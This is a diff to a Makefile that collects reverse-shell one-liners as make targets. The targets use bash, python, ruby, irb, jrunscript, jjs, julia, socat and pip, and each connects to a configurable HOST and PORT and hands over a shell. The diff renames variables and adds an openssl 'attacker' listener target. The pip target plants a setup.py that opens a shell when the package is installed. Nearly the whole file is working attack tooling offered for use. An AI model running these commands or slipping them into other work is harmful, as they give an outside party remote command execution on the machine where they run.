@@ -4,7 +4,7 @@ PORT	:= 4444
 PORT2	:= 4445
 TMP	:= /tmp/f
 
-METHODS	:= bash1 bash2 bash3 ksh zsh pwsh ncat1 ncat2 telnet1 telnet2 socket openssl python perl php1 php2 php3 php4 php5 php6 ruby1 ruby2 irb1 irb2 node jrunscript jjs julia socat pip cpan
+METHODS	:= bash1 bash2 bash3 ksh zsh pwsh ncat1 ncat2 telnet1 telnet2 socket openssl openssl-attacker python perl php1 php2 php3 php4 php5 php6 ruby1 ruby2 irb1 irb2 node jrunscript jjs julia socat pip cpan
 
 BOLD		:= \033[1m
 UNDERLINE	:= \033[4m
@@ -127,10 +127,10 @@ telnet2-show:
 ########################## SOCKET ##########################
 
 socket:
-	socket -qvp '$(SHELL)' $(HOST) $(PORT)
+	socket -p '$(SHELL)' $(HOST) $(PORT)
 
 socket-show:
-	@printf "socket -qvp '$(SHELL)' $(HOST) $(PORT)\n"
+	@printf "socket -p '$(SHELL)' $(HOST) $(PORT)\n"
 
 ############################################################
 
@@ -142,15 +142,23 @@ openssl:
 openssl-show:
 	@printf "mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | openssl s_client -quiet -connect $(HOST):$(PORT) > $(TMP); rm $(TMP)\n"
 
+openssl-attacker:
+	openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -noenc
+	openssl s_server -quiet -key key.pem -cert cert.pem -port $(PORT)
+
+openssl-attacker-show:
+	@printf "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -noenc\n"
+	@printf "openssl s_server -quiet -key key.pem -cert cert.pem -port $(PORT)\n"
+
 ############################################################
 
 ########################## PYTHON ##########################
 
 python:
-	python -c 'import socket,os,subprocess; s = socket.socket(); s.connect(("$(HOST)",$(PORT))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call(["$(SHELL)"])'
+	python -c 'import socket,os,subprocess; sock = socket.socket(); sock.connect(("$(HOST)",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; subprocess.call(["$(SHELL)"])'
 
 python-show:
-	@printf "python -c 'import socket,os,subprocess; s = socket.socket(); s.connect((\"$(HOST)\",$(PORT))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call([\"$(SHELL)\"])'\n"
+	@printf "python -c 'import socket,os,subprocess; sock = socket.socket(); sock.connect((\"$(HOST)\",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; subprocess.call([\"$(SHELL)\"])'\n"
 
 ############################################################
 
@@ -217,32 +225,32 @@ php6-show:
 ########################### RUBY ###########################
 
 ruby1:
-	ruby -rsocket -e 's = TCPSocket.new("$(HOST)",$(PORT)); STDIN.reopen(s); STDOUT.reopen(s); STDERR.reopen(s); exec "$(SHELL)"'
+	ruby -rsocket -e 'sock = TCPSocket.new("$(HOST)",$(PORT)); STDIN.reopen(sock); STDOUT.reopen(sock); STDERR.reopen(sock); exec "$(SHELL)"'
 
 ruby1-show:
-	@printf "ruby -rsocket -e 's = TCPSocket.new(\"$(HOST)\",$(PORT)); STDIN.reopen(s); STDOUT.reopen(s); STDERR.reopen(s); exec \"$(SHELL)\"'\n"
+	@printf "ruby -rsocket -e 'sock = TCPSocket.new(\"$(HOST)\",$(PORT)); STDIN.reopen(sock); STDOUT.reopen(sock); STDERR.reopen(sock); exec \"$(SHELL)\"'\n"
 
 ruby2:
-	ruby -rsocket -e 's = TCPSocket.new("$(HOST)",$(PORT)); while(cmd = s.gets); IO.popen(cmd,"r"){|io| s.print io.read} end'
+	ruby -rsocket -e 'sock = TCPSocket.new("$(HOST)",$(PORT)); while(cmd = sock.gets); IO.popen(cmd,"r"){|io| sock.print io.read} end'
 
 ruby2-show:
-	@printf "ruby -rsocket -e 's = TCPSocket.new(\"$(HOST)\",$(PORT)); while(cmd = s.gets); IO.popen(cmd,\"r\"){|io| s.print io.read} end'\n"
+	@printf "ruby -rsocket -e 'sock = TCPSocket.new(\"$(HOST)\",$(PORT)); while(cmd = sock.gets); IO.popen(cmd,\"r\"){|io| sock.print io.read} end'\n"
 
 ############################################################
 
 ############################ IRB ###########################
 
 irb1:
-	echo 'require "socket"; s = TCPSocket.new("$(HOST)",$(PORT)); STDIN.reopen(s); STDOUT.reopen(s); STDERR.reopen(s); exec "$(SHELL)"' | irb
+	echo 'require "socket"; sock = TCPSocket.new("$(HOST)",$(PORT)); STDIN.reopen(sock); STDOUT.reopen(sock); STDERR.reopen(sock); exec "$(SHELL)"' | irb
 
 irb1-show:
-	@printf "echo 'require \"socket\"; s = TCPSocket.new(\"$(HOST)\",$(PORT)); STDIN.reopen(s); STDOUT.reopen(s); STDERR.reopen(s); exec \"$(SHELL)\"' | irb\n"
+	@printf "echo 'require \"socket\"; sock = TCPSocket.new(\"$(HOST)\",$(PORT)); STDIN.reopen(sock); STDOUT.reopen(sock); STDERR.reopen(sock); exec \"$(SHELL)\"' | irb\n"
 
 irb2:
-	echo 'require "socket"; s = TCPSocket.new("$(HOST)",$(PORT)); while(cmd = s.gets); IO.popen(cmd,"r"){|io| s.print io.read} end' | irb
+	echo 'require "socket"; sock = TCPSocket.new("$(HOST)",$(PORT)); while(cmd = sock.gets); IO.popen(cmd,"r"){|io| sock.print io.read} end' | irb
 
 irb2-show:
-	@printf "echo 'require \"socket\"; s = TCPSocket.new(\"$(HOST)\",$(PORT)); while(cmd = s.gets); IO.popen(cmd,\"r\"){|io| s.print io.read} end' | irb\n"
+	@printf "echo 'require \"socket\"; sock = TCPSocket.new(\"$(HOST)\",$(PORT)); while(cmd = sock.gets); IO.popen(cmd,\"r\"){|io| sock.print io.read} end' | irb\n"
 
 ############################################################
 
@@ -259,20 +267,20 @@ node-show:
 ######################## JRUNSCRIPT ########################
 
 jrunscript:
-	jrunscript -e 'var p = new java.lang.ProcessBuilder("$(SHELL)").redirectErrorStream(true).start(); var s = new java.net.Socket("$(HOST)",$(PORT)); var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); var po = p.getOutputStream(), so = s.getOutputStream(); while(!s.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(50); try { p.exitValue(); break; } catch (e){}}; p.destroy(); s.close();'
+	jrunscript -e 'var p = new java.lang.ProcessBuilder("$(SHELL)").redirectErrorStream(true).start(); var sock = new java.net.Socket("$(HOST)",$(PORT)); var pi = p.getInputStream(), pe = p.getErrorStream(), si = sock.getInputStream(); var po = p.getOutputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(50); try { p.exitValue(); break; } catch (e){}}; p.destroy(); sock.close();'
 
 jrunscript-show:
-	@printf "jrunscript -e 'var p = new java.lang.ProcessBuilder(\"$(SHELL)\").redirectErrorStream(true).start(); var s = new java.net.Socket(\"$(HOST)\",$(PORT)); var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); var po = p.getOutputStream(), so = s.getOutputStream(); while(!s.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(50); try { p.exitValue(); break; } catch (e){}}; p.destroy(); s.close();'\n"
+	@printf "jrunscript -e 'var p = new java.lang.ProcessBuilder(\"$(SHELL)\").redirectErrorStream(true).start(); var sock = new java.net.Socket(\"$(HOST)\",$(PORT)); var pi = p.getInputStream(), pe = p.getErrorStream(), si = sock.getInputStream(); var po = p.getOutputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(50); try { p.exitValue(); break; } catch (e){}}; p.destroy(); sock.close();'\n"
 
 ############################################################
 
 ############################ JJS ###########################
 
 jjs:
-	echo 'var p = new java.lang.ProcessBuilder("$(SHELL)").redirectErrorStream(true).start(); var s = new java.net.Socket("$(HOST)",$(PORT)); var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); var po = p.getOutputStream(), so = s.getOutputStream(); while(!s.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(50); try { p.exitValue(); break; } catch (e){}}; p.destroy(); s.close();' | jjs
+	echo 'var p = new java.lang.ProcessBuilder("$(SHELL)").redirectErrorStream(true).start(); var sock = new java.net.Socket("$(HOST)",$(PORT)); var pi = p.getInputStream(), pe = p.getErrorStream(), si = sock.getInputStream(); var po = p.getOutputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(50); try { p.exitValue(); break; } catch (e){}}; p.destroy(); sock.close();' | jjs
 
 jjs-show:
-	@printf "echo 'var p = new java.lang.ProcessBuilder(\"$(SHELL)\").redirectErrorStream(true).start(); var s = new java.net.Socket(\"$(HOST)\",$(PORT)); var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); var po = p.getOutputStream(), so = s.getOutputStream(); while(!s.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(50); try { p.exitValue(); break; } catch (e){}}; p.destroy(); s.close();' | jjs\n"
+	@printf "echo 'var p = new java.lang.ProcessBuilder(\"$(SHELL)\").redirectErrorStream(true).start(); var sock = new java.net.Socket(\"$(HOST)\",$(PORT)); var pi = p.getInputStream(), pe = p.getErrorStream(), si = sock.getInputStream(); var po = p.getOutputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(50); try { p.exitValue(); break; } catch (e){}}; p.destroy(); sock.close();' | jjs\n"
 
 ############################################################
 
@@ -282,7 +290,7 @@ julia:
 	julia -e 'using Sockets; sock = connect("$(HOST)", parse(Int64,"$(PORT)")); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
 
 julia-show:
-	@printf "julia -e 'using Sockets; sock = connect(\"$(HOST)\", parse(Int64,\"$(PORT)\")); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`\$$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'\n"
+	@printf "julia -e 'using Sockets; sock = connect(\"$(HOST)\", parse(Int64,\"$(PORT)\")); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(\`\$$cmd\`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'\n"
 
 ############################################################
 
@@ -299,9 +307,9 @@ socat-show:
 ########################### PIP ############################
 
 pip:
-	mkdir -p $(TMP); echo 'import sys,socket,os,pty; s = socket.socket(); s.connect(("$(HOST)",$(PORT))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("$(SHELL)")' > $(TMP)/setup.py; pip install --break-system-packages $(TMP); rm -r $(TMP)
+	mkdir -p $(TMP); echo 'import sys,socket,os,pty; sock = socket.socket(); sock.connect(("$(HOST)",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; pty.spawn("$(SHELL)")' > $(TMP)/setup.py; pip install --break-system-packages $(TMP); rm -r $(TMP)
 
 pip-show:
-	@printf "mkdir -p $(TMP); echo 'import sys,socket,os,pty; s = socket.socket(); s.connect((\"$(HOST)\",$(PORT))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"$(SHELL)\")' > $(TMP)/setup.py; pip install --break-system-packages $(TMP); rm -r $(TMP)\n"
+	@printf "mkdir -p $(TMP); echo 'import sys,socket,os,pty; sock = socket.socket(); sock.connect((\"$(HOST)\",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"$(SHELL)\")' > $(TMP)/setup.py; pip install --break-system-packages $(TMP); rm -r $(TMP)\n"
 
 ############################################################
